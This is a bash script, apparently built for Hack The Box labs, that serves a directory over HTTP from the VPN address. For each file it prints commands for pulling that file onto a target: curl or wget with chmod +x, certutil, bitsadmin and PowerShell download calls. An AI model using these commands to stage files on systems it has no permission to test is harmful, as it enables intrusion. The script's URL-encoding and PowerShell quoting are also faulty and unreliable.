#!/usr/bin/env bash
# serve_local.sh
# Serve current directory with goshs (foreground). Prints download commands for each real file.
set -euo pipefail

PORT=80

# Get tun0 IP only
get_tun0_ip() {
  ip -4 addr show tun0 2>/dev/null | awk '/inet / {print $2}' | cut -d/ -f1
}

LOCAL_IP="$(get_tun0_ip)"

if [[ -z "$LOCAL_IP" ]]; then
  echo "ERROR: No IPv4 address found on tun0 (is VPN/HTB connected?)"
  exit 1
fi

echo "tun0 IP detected: $LOCAL_IP"
echo

# Collect regular files (non-recursive) in current directory
# Handles filenames with spaces/newlines safely by using NUL separators
mapfile -t FILES < <(find . -maxdepth 1 -type f -print0 | xargs -0 -n1 -I{} basename "{}" 2>/dev/null || true)

if [[ ${#FILES[@]} -eq 0 ]]; then
  echo "No regular files found in $(pwd)."
  echo
else
  echo "Files in $(pwd):"
  for f in "${FILES[@]}"; do
    echo "  - $f"
  done
  echo
fi

# Print download commands per file
echo "========== Download commands (per file) =========="
if [[ ${#FILES[@]} -eq 0 ]]; then
  echo "No files to print commands for. You can still browse the directory index at http://$LOCAL_IP:$PORT/"
else
  for f in "${FILES[@]}"; do
    # URL-encode minimal characters for space -> %20 (safe enough for typical filenames)
    # A simple URL-escape for spaces and a few common chars:
    url_encoded="${f// /%20}"
    url_encoded="${url_encoded//\#/%%23}"
    url_encoded="${url_encoded//\%/%%25}"
    echo
    echo "File: $f"
    echo "  Linux:"
  echo "    curl -fsSL \"http://$LOCAL_IP:$PORT/$url_encoded\" -o \"$f\" && chmod +x \"$f\""
  echo "    wget -q --show-progress -O \"$f\" \"http://$LOCAL_IP:$PORT/$url_encoded\" && chmod +x \"$f\""
    echo
    echo "  Windows (CMD):"
    echo "    certutil -urlcache -split -f \"http://$LOCAL_IP:$PORT/$url_encoded\" \"$f\""
    echo "    curl \"http://$LOCAL_IP:$PORT/$url_encoded\" --output \"$f\""
    echo "    bitsadmin /transfer dl \"http://$LOCAL_IP:$PORT/$url_encoded\" \"$f\""
    echo
    echo "  Windows (PowerShell):"
    echo "    PowerShell -Command \"Invoke-WebRequest -Uri 'http://$LOCAL_IP:$PORT/$url_encoded' -OutFile '$f'\""
    echo "    PowerShell -Command \"(New-Object System.Net.WebClient).DownloadFile('http://$LOCAL_IP:$PORT/$url_encoded',''$f'')\""
    echo "    PowerShell -Command \"iwr 'http://$LOCAL_IP:$PORT/$url_encoded' -OutFile '$f'\""
  done
fi

echo
echo "=============================================="
echo "Starting goshs server on port $PORT (foreground)"
echo "Serving directory: $(pwd)"
echo "URL: http://$LOCAL_IP:$PORT/"
echo "(Press Ctrl+C to stop)"
echo "=============================================="
echo

# Check goshs exists
if ! command -v goshs >/dev/null 2>&1; then
  echo "ERROR: 'goshs' not found in PATH. Install goshs or run a different server (e.g., python3 -m http.server $PORT)"
  exit 1
fi

# Start goshs in foreground, binding default (goshs typically listens on all interfaces)
exec goshs -p "$PORT"
